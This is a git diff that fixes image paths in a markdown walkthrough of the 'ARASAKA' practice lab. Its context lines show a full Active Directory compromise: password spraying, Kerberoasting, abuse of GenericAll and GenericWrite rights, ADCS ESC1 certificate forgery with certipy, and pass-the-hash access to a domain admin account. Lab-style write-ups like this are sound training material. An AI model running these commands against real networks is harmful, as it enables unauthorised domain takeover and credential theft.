@@ -2,7 +2,7 @@
 
 ## ARASAKA
 
-![image.png](<../.gitbook/assets/image (3).png>)
+![image.png](<../../.gitbook/assets/image (3).png>)
 
 ## Scenario-Starting Credentials
 
@@ -128,7 +128,7 @@ PORT      STATE SERVICE       REASON          VERSION
 nxc smb hacksmarter.local -u faraday -p 'hacksmarter123' --shares
 ```
 
-![image.png](<../.gitbook/assets/image 1 (2).png>)
+![image.png](<../../.gitbook/assets/image 1 (2).png>)
 
 * We can confirm the creds and also there is not much to the shares
 * As a best practice, we can enumerate for other users since `IPC$` has read permissions to it
@@ -164,7 +164,7 @@ awk '{print $6}' names.txt | sed 's/HACKSMARTER\\//' > users.txt
 
 ```
 
-![image.png](<../.gitbook/assets/image 2 (3).png>)
+![image.png](<../../.gitbook/assets/image 2 (3).png>)
 
 *   We have a list of users and a password, as a best practice again we can attempt to password spry for password reuse
 
@@ -172,19 +172,19 @@ awk '{print $6}' names.txt | sed 's/HACKSMARTER\\//' > users.txt
     nxc smb  10.0.24.128 -u users.txt -p 'hacksmarter123' --continue-on-success
     ```
 
-![image.png](<../.gitbook/assets/image 3 (3).png>)
+![image.png](<../../.gitbook/assets/image 3 (3).png>)
 
 * Only the user `faraday` uses the password `hacksmarter123`
 
 #### Enumerating for pre-created computer accounts
 
-![image.png](<../.gitbook/assets/image 4 (2).png>)
+![image.png](<../../.gitbook/assets/image 4 (2).png>)
 
 * No pre-created computer account
 
 #### Enumerating for `certificate services`
 
-![image.png](<../.gitbook/assets/image 5 (1).png>)
+![image.png](<../../.gitbook/assets/image 5 (1).png>)
 
 * We have found a CN and will test for ADCS misconfigurations
 * This was obtained from our `rustscan`
@@ -200,7 +200,7 @@ We can use the provided creds `faraday:hacksmarter123` to obtain the loot
 nxc ldap DC01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --bloodhound --collection All --dns-server  10.0.24.128
 ```
 
-![image.png](<../.gitbook/assets/image 6 (2).png>)
+![image.png](<../../.gitbook/assets/image 6 (2).png>)
 
 #### Bloodhound enumeration
 
@@ -210,21 +210,21 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
 * Check for all Kerberoastable user accounts
 * Find Shortest path to admin
 
-![image.png](<../.gitbook/assets/image 7 (1).png>)
+![image.png](<../../.gitbook/assets/image 7 (1).png>)
 
 * `faraday` user has nothing interesting.
 * We then have to go for our checklist above
 
-![image.png](<../.gitbook/assets/image 8 (1).png>)
+![image.png](<../../.gitbook/assets/image 8 (1).png>)
 
 * Queried for `All Domain Admins` and we have an interesting Admin `The_Emperor`
 
-![image.png](<../.gitbook/assets/image 9 (1).png>)
+![image.png](<../../.gitbook/assets/image 9 (1).png>)
 
 * `ALT.SVC` is a Kerberoastable user and is also in our `users.txt` file
 * We can perform kerberoasting
 
-![image.png](<../.gitbook/assets/image 10 (1).png>)
+![image.png](<../../.gitbook/assets/image 10 (1).png>)
 
 *   Attempting to crack the hash
 
@@ -235,26 +235,26 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
 
     ```
 
-![image.png](<../.gitbook/assets/image 11 (1).png>)
+![image.png](<../../.gitbook/assets/image 11 (1).png>)
 
 * We were successful in cracking the hash and the password for the `alt.svc` is `babygirl1`
 * As a best practice, we can also perform a password spry amongst the `users.txt` to check for a password reuse
 * The script used above was obtained from https://github.com/TeneBrae93/offensivesecurity/tree/main/active-directory
 
-![image.png](<../.gitbook/assets/image 12 (1).png>)
+![image.png](<../../.gitbook/assets/image 12 (1).png>)
 
 * The `Alt.svc` has `GenericAll` over `Yorinobu` user
 * This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.
 
-![image.png](<../.gitbook/assets/image 13 (1).png>)
+![image.png](<../../.gitbook/assets/image 13 (1).png>)
 
-![image.png](<../.gitbook/assets/image 14 (1).png>)
+![image.png](<../../.gitbook/assets/image 14 (1).png>)
 
 * The user `YORINOBU@HACKSMARTER.LOCAL` has generic write access to the user `SOULKILLER.SVC@HACKSMARTER.LOCAL.`
 * `GenericWrite` access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user.
 * The user `YORINOBU@HACKSMARTER.LOCAL` is a member of `Remote Management & Remote Desktop` and we can `rdp or Evilwinrm`
 
-![image.png](<../.gitbook/assets/image 15 (1).png>)
+![image.png](<../../.gitbook/assets/image 15 (1).png>)
 
 * The `SOULKILLER.SVC@HACKSMARTER.LOCAL` user has not much to it yet.
 
@@ -268,7 +268,7 @@ NB. We also haven't looked at the Certificate Authority `hacksmarter-DC01-CA` . 
 
 #### Compromising user `Yorinobu`
 
-![image.png](<../.gitbook/assets/image 12 (1).png>)
+![image.png](<../../.gitbook/assets/image 12 (1).png>)
 
 *   Attempting to change the password
 
@@ -280,7 +280,7 @@ NB. We also haven't looked at the Certificate Authority `hacksmarter-DC01-CA` . 
     evil-winrm -i 10.0.24.128 -u Yorinobu -p 'RedBlue!@7'
     ```
 
-![image.png](<../.gitbook/assets/image 17 (2).png>)
+![image.png](<../../.gitbook/assets/image 17 (2).png>)
 
 * We were able to successfully connect with `Evil-winrm` But however, there was no USER-FlAG.
 * Well the only flag required however is the `root.txt` flag.
@@ -293,7 +293,7 @@ _I went down a rabbit hole so deep even BloodHound asked if I needed help. LOL_
 
 ### Enumerating and Compromising CA
 
-![image.png](<../.gitbook/assets/image 5 (1).png>)
+![image.png](<../../.gitbook/assets/image 5 (1).png>)
 
 * The above information was obtained when we were checking for our quick wins above.
 
@@ -303,9 +303,9 @@ _I went down a rabbit hole so deep even BloodHound asked if I needed help. LOL_
 certipy-ad find -u 'Yorinobu@hacksmarter.local' -p 'RedBlue!@7' -dc-ip 10.0.24.128
 ```
 
-![image.png](<../.gitbook/assets/image 19 (3).png>)
+![image.png](<../../.gitbook/assets/image 19 (3).png>)
 
-![image.png](<../.gitbook/assets/image 20 (1).png>)
+![image.png](<../../.gitbook/assets/image 20 (1).png>)
 
 * Nothing we found so far is of interest
 * QUESTION IS WHAT NEXT?????????????????????????????
@@ -314,7 +314,7 @@ certipy-ad find -u 'Yorinobu@hacksmarter.local' -p 'RedBlue!@7' -dc-ip 10.0.24.1
 
 ### Compromising `SOULKILLER.svc`
 
-![image.png](<../.gitbook/assets/image 21 (2).png>)
+![image.png](<../../.gitbook/assets/image 21 (2).png>)
 
 * The user `YORINOBU` has generic write access to the user `SOULKILLER.svc`
 * `Generic Write` access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "`serviceprincipalnames`" for a user
@@ -324,7 +324,7 @@ certipy-ad find -u 'Yorinobu@hacksmarter.local' -p 'RedBlue!@7' -dc-ip 10.0.24.1
     targetedKerberoast.py -v -d 'hacksmarter.local' -u 'Yorinobu' -p 'RedBlue!@7'
     ```
 
-![image.png](<../.gitbook/assets/image 22 (2).png>)
+![image.png](<../../.gitbook/assets/image 22 (2).png>)
 
 *   Attempting to crack the hash
 
@@ -333,7 +333,7 @@ certipy-ad find -u 'Yorinobu@hacksmarter.local' -p 'RedBlue!@7' -dc-ip 10.0.24.1
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 23 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 23 (2).png>)
 
     * We successfully obtained the password for user `SOULKILLER.svc`
 
@@ -346,7 +346,7 @@ SOULKILLER:MYpassword123#
 nxc smb 10.0.24.128 -u Soulkiller.svc -p 'REDACTED'
 ```
 
-![image.png](<../.gitbook/assets/image 24 (2).png>)
+![image.png](<../../.gitbook/assets/image 24 (2).png>)
 
 * We can confirm that our creds worked
 * Now what should we do with these creds??????????????????????????????????????
@@ -356,9 +356,9 @@ nxc smb 10.0.24.128 -u Soulkiller.svc -p 'REDACTED'
     certipy-ad find -u 'soulkiller.svc@hacksmarter.local' -p 'REDACTED' -dc-ip 10.0.24.128 -vulnerable
     ```
 
-![image.png](<../.gitbook/assets/image 25 (2).png>)
+![image.png](<../../.gitbook/assets/image 25 (2).png>)
 
-![image.png](<../.gitbook/assets/image 26 (2).png>)
+![image.png](<../../.gitbook/assets/image 26 (2).png>)
 
 #### Exploiting ESC1
 
@@ -377,16 +377,16 @@ certipy-ad req \
     -upn 'administrator@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-500'
 ```
 
-![image.png](<../.gitbook/assets/image 27 (1).png>)
+![image.png](<../../.gitbook/assets/image 27 (1).png>)
 
-![image.png](<../.gitbook/assets/image 28 (1).png>)
+![image.png](<../../.gitbook/assets/image 28 (1).png>)
 
 * Failed to request the certificate with `administrator SID`
 * In our bloodhound query we also had a `The_Emperor` as one of `All Domain Admins`
 
 THERE IS A VERY BIG MISTAKE I DID ON REQUESTING A CERTIFICATE AS THE ADMINISTRATOR. WELL CAN YOU SPOT IT. IF SO YOU CAN TRY AGAIN
 
-![image.png](<../.gitbook/assets/image 8 (1).png>)
+![image.png](<../../.gitbook/assets/image 8 (1).png>)
 
 *   Requesting for an SID of `The_Emperor` user
 
@@ -394,7 +394,7 @@ THERE IS A VERY BIG MISTAKE I DID ON REQUESTING A CERTIFICATE AS THE ADMINISTRAT
     certipy-ad account -u 'soulkiller.svc' -p 'REDACTED' -dc-ip '10.0.24.128' -user 'the_emperor' read
     ```
 
-![image.png](<../.gitbook/assets/image 30 (1).png>)
+![image.png](<../../.gitbook/assets/image 30 (1).png>)
 
 ```bash
 certipy-ad req \
@@ -404,7 +404,7 @@ certipy-ad req \
     -upn 'the_emperor@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-1601'
 ```
 
-![image.png](<../.gitbook/assets/image 31 (1).png>)
+![image.png](<../../.gitbook/assets/image 31 (1).png>)
 
 * The output confirms that a certificate was issued
 *   The attacker now uses the generated `the_emperor.pfx` file with certipy auth to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.
@@ -413,7 +413,7 @@ certipy-ad req \
     certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip '10.0.24.128'
     ```
 
-![image.png](<../.gitbook/assets/image 32 (2).png>)
+![image.png](<../../.gitbook/assets/image 32 (2).png>)
 
 ```bash
 evil-winrm -i 10.0.24.128 -u the_emperor -H d8764<REDACTED>f90f5f30bd6789b133
@@ -425,6 +425,6 @@ evil-winrm -i 10.0.24.128 -u the_emperor -H d8764<REDACTED>f90f5f30bd6789b133
 gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
 ```
 
-![image.png](<../.gitbook/assets/image 33 (2).png>)
+![image.png](<../../.gitbook/assets/image 33 (2).png>)
 
 ### HURRAY. We did it!!!!!!!!!
